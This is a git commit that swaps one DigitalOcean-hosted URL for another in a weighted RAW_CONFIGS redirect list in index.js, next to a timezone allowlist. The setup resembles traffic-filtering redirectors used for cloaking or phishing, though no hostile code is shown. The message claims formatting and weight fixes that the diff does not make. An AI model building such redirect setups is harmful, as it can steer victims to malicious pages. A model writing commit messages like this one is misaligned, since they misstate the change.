e0f446e07dbcac582b279e12513fc5bba32f6d9c
paalakash <palaksh452@gmail.com>
2026-07-10 08:32:25 +0530

    Fix URL formatting and weight in RAW_CONFIGS
    Corrected URL formatting and ensured proper weight assignment.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://coral-app-h59hy.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://squid-app-2-yqjy6.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
